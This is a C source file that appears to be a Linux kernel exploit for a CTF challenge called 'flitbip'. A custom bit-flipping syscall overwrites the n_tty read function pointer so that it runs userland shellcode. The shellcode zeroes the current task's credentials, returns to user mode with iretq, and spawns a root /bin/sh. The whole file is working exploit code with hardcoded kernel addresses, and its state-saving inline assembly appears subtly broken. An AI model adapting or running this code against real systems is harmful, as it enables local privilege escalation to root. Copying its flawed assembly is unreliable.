#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>


// commands
#define DEV_PATH ""   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  setreuid(0, 0);
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

const ulong n_tty_ops_read = 0xffffffff8183e320 + 0x30;
const ulong n_tty_read = 0xffffffff810c8510;

static void shellcode(void){
  // まずはお直し
  *((ulong*)n_tty_ops_read) = n_tty_read;

  // そのあとpwn
  scu current_task = 0xffffffff8182e040;
  scu cred = current_task + 0x3c0;
  for(int ix=0; ix!=3; ++ix)
    ((uint *)cred)[ix] = 0;
  asm(
    "swapgs\n"
    "mov %%rax, %0\n"
    "push %%rax\n"
    "mov %%rax, %1\n"
    "push %%rax\n"
    "mov %%rax, %2\n"
    "push %%rax\n"
    "mov %%rax, %3\n"
    "push %%rax\n"
    "mov %%rax, %4\n"
    "push %%rax\n"
    "iretq\n"
    :: "r" (user_ss), "r" (user_sp), "r"(user_rflags), "r" (user_cs), "r" (&NIRUGIRI) : "memory"
  );
}
// (END utils)

// flitbip
const ulong flit_count = 0xffffffff818f4f78;

long _fff(long *addr, long bit){
  asm(
      "mov rax, 333\n"
      "syscall\n"
  );
}
long fff(long *addr, long bit){
  long tmp = _fff(addr, bit);
  assert(tmp == 0);
  return tmp;
}
// (END flitbip)

int main(int argc, char *argv[]) {
  save_state();
  int pid = getpid();
  printf("[+] my pid: %lx\n", pid);

  char buf[0x200];
  printf("[+] shellcode @ %p\n", shellcode);
  ulong flipper = n_tty_read ^ (ulong)&shellcode;
  fff(flit_count, 63);

  for(int ix=0; ix!=64; ++ix){
    if(flipper & 1 == 1){
      fff(n_tty_ops_read, ix);
    }
    flipper >>= 1;
  }

  fgets(buf, sizeof(buf), stdin);

  printf("[!] unreachable\n");
  return 0;
}
